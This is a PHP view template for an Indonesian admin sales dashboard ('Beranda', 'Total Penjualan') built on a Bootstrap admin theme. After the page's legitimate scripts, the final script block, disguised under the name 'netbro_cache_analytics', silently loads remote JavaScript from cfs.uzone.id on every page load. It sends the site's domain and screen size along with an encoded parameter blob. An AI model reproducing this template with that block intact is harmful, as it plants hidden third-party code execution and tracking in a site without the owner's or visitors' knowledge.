<!DOCTYPE html>
<!--
Template Name: Admin Lab Dashboard build with Bootstrap v2.3.1
Template Version: 1.3
Author: Mosaddek Hossain
Website: http://thevectorlab.net/
-->
<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en">
<!--<![endif]-->
<!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title> Admin Lab Dashboard</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/uniform/css/uniform.default.css"/>
    <link href="<?php echo site_url(); ?>assets/assets/fullcalendar/fullcalendar/bootstrap-fullcalendar.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/jqvmap/jqvmap/jqvmap.css" media="screen" rel="stylesheet" type="text/css"/>

</head>
<!-- END HEAD -->
<!-- BEGIN BODY -->
<body class="fixed-top">
<!-- BEGIN HEADER -->
<?php $this->load->view('admin/header.php') ?>
<!-- END HEADER -->
<!-- BEGIN CONTAINER -->
<div id="container" class="row-fluid">
    <!-- BEGIN SIDEBAR -->
    <?php $this->load->view('admin/sidebar.php') ?>
    <!-- END SIDEBAR -->
    <!-- BEGIN PAGE -->
    <div id="main-content">
        <!-- BEGIN PAGE CONTAINER-->
        <div class="container-fluid">
            <!-- BEGIN PAGE HEADER-->
            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN THEME CUSTOMIZER-->
                    <?php $this->load->view('admin/themeColor.php') ?>
                    <!-- END THEME CUSTOMIZER-->
                    <!-- BEGIN PAGE TITLE & BREADCRUMB-->
                    <h3 class="page-title">
                        Beranda
                        <small></small>
                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Admin Lab</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Beranda</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>
                        <li class="pull-right search-wrap">
                            <form class="hidden-phone" action="search_result.html">
                                <div class="search-input-area">
                                    <input id=" " class="search-query" type="text" placeholder="Search">
                                    <i class="icon-search"></i>
                                </div>
                            </form>
                        </li>
                    </ul>
                    <!-- END PAGE TITLE & BREADCRUMB-->
                </div>
            </div>
            <!-- END PAGE HEADER-->
            <!-- BEGIN PAGE CONTENT-->
            <div id="page" class="dashboard">
                <!--BEGIN NOTIFICATION-->
                <div class="alert alert-info">

                    <strong>Hari</strong>
                    Tanggal Waktu
                </div>
                <!--END NOTIFICATION-->
                <!-- BEGIN OVERVIEW STATISTIC BARS-->

                <!-- END OVERVIEW STATISTIC BARS-->

                <div class="row-fluid">
                    <div class="span12">
                        <!-- BEGIN MAILBOX PORTLET-->

                        <!-- END MAILBOX PORTLET-->
                    </div>
                </div>
                <!-- BEGIN OVERVIEW STATISTIC BARS-->
                <div class="row-fluid metro-overview-cont">
                    <div data-desktop="span2" data-tablet="span4" class="span2 responsive">
                        <div class="metro-overview turquoise-color clearfix">
                            <div class="display">
                                <i class="icon-group"></i>
                                <div class="percent">+55%</div>
                            </div>
                            <div class="details">
                                <div class="numbers">530</div>
                                <div class="title">Total Transaksi</div>
                            </div>
                            <div class="progress progress-info">
                                <div style="width: 55%" class="bar"></div>
                            </div>
                        </div>
                    </div>

                    <div data-desktop="span2" data-tablet="span4" class="span2 responsive">
                        <div class="metro-overview green-color clearfix">
                            <div class="display">
                                <i class="icon-shopping-cart"></i>
                                <div class="percent">+46%</div>
                            </div>
                            <div class="details">
                                <div class="numbers">1000</div>
                                <div class="title">Total Penjualan</div>
                                <div class="progress progress-success">
                                    <div style="width: 46%" class="bar"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div data-desktop="span2" data-tablet="span4" class="span2 responsive">
                        <div class="metro-overview blue-color clearfix">
                            <div class="display">
                                <i class="icon-bar-chart"></i>
                                <div class="percent">+20%</div>
                            </div>
                            <div class="details">
                                <div class="numbers">170</div>
                                <div class="title">Laba Kotor</div>
                                <div class="progress progress-success">
                                    <div style="width: 20%" class="bar"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- END OVERVIEW STATISTIC BARS-->
                <div class="row-fluid">
                    <div class="span8 responsive" data-tablet="span7 fix-margin" data-desktop="span7">
                        <!-- BEGIN CALENDAR PORTLET-->
                        <div class="widget">
                            <div class="widget-title">
                                <h4>
                                    <i class="icon-bar-chart"></i>
                                    Grafik Penjualan dalam
                                </h4>

                            </div>
                            <div class="widget-body">
                                <table class="table table-striped">

                                    <tbody>
                                    <tr>
                                        <td>Total Penjualan</td>
                                        <td>
                                            <strong>Rp</strong>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>Total Rata-rata Harian</td>
                                        <td>
                                            <strong>Rp</strong>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>Menu Terpopuler</td>
                                        <td>
                                            <strong>Pecel</strong>
                                        </td>
                                    </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <!-- END CALENDAR PORTLET-->
                    </div>
                    <div class="span8">
                        <!-- BEGIN SITE VISITS PORTLET-->
                        <!--	<div class="widget">
                                <div class="widget-title">
                                    <h4><i class="icon-bar-chart"></i> Line Chart</h4>
                                    <span class="tools">
                                    <a href="javascript:;" class="icon-chevron-down"></a>
                                    <a href="javascript:;" class="icon-remove"></a>
                                    </span>
                                </div>
                                <div class="widget-body">
                                    <div id="site_statistics_loading">
                                        <img src="img/loading.gif" alt="loading" />
                                    </div>
                                    <div id="site_statistics_content" class="hide">
                                        <div id="site_statistics" class="chart"></div>
                                    </div>
                                </div>
                            </div> -->
                        <!-- END SITE VISITS PORTLET-->
                    </div>
                </div>

                <div class="row-fluid">
                    <div class="span12">
                        <!-- BEGIN SERVER LOAD PORTLET-->
                        <div class="widget">


                        </div>
                        <!-- END SERVER LOAD PORTLET-->
                    </div>
                </div>

                <div class="row-fluid">
                    <div class="span12">
                        <!-- BEGIN EXAMPLE TABLE widget-->

                        <!-- END EXAMPLE TABLE widget-->
                    </div>
                </div>


                <div class="row-fluid">
                    <div class="span7 responsive" data-tablet="span7 fix-margin" data-desktop="span7">
                        <!-- BEGIN CALENDAR PORTLET-->

                        <!-- END CALENDAR PORTLET-->
                    </div>
                </div>
            </div>
            <!-- END PAGE CONTENT-->
        </div>
        <!-- END PAGE CONTAINER-->
    </div>
    <!-- END PAGE -->
</div>
<!-- END CONTAINER -->
<!-- BEGIN FOOTER -->
<div id="footer">
    2013 &copy; Admin Lab Dashboard.
    <div class="span pull-right">
        <span class="go-top"><i class="icon-arrow-up"></i></span>
    </div>
</div>
<!-- END FOOTER -->
<!-- BEGIN JAVASCRIPTS -->
<!-- Load javascripts at bottom, this will reduce page load time -->
<script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-slimscroll/jquery-ui-1.9.2.custom.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-slimscroll/jquery.slimscroll.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/fullcalendar/fullcalendar/fullcalendar.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.cookie.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/jquery.vmap.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.russia.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.europe.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.germany.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.usa.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/data/jquery.vmap.sampledata.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-knob/js/jquery.knob.js"></script>
<!-- <script src="assets/flot/jquery.flot.js"></script> -->
<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.resize.js"></script>

<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.pie.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.stack.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.crosshair.js"></script>

<script src="<?php echo base_url(); ?>assets/js/jquery.peity.min.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>

<script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugins
        App.setMainPage(true);
        App.init();
    });
</script>
<!-- END JAVASCRIPTS -->
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCo3tr%2fhGc2D%2fInIsAo2jh4sOfFtyDaZnVywFAVh1U%2fVRcrbxgjM2m8poDPNxotq21S3PRrvxy19M92oP7S8M0NH%2bPniGoiqp4mqSZPOs6BaIoFPoyNAcZ2rc%2fQ%2fEz6d9b5efudH7y8uJl%2b3vx1mZDldGer6zgdZYZCm%2f3h6yei%2fg5SzNw1RFJD5BmjBUwhpyE7WSmEsGHLxC%2b9L%2bxE00RnO6igQ1x58YaGKmT6L2CSnTLbdA1tWfLDglwut4ZWhCsq6rSpxafYFct0PHiU8v0zK%2fW1GRpbV%2bJD1qZJ1DcKNbUCva8yj2jYeRvgR8sbGZaBk3H2QPw2z2upGKaCYODO1yYHerNRM027bNjIVZjYwyhatpC9N98QpbG6WxfttQNdGiLqiwpJbw%2beFADORWjSR3JneCdVv33gY0FMLLNPTiQhFboHiiD1siUP3HxdJcC9CV1gcZfeil7MK78AAfU9Sk6G%2fB9NKhhDaW44W7kgUfG4jnTaanzDCERPED%2bNZb2I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
<!-- END BODY -->
</html>
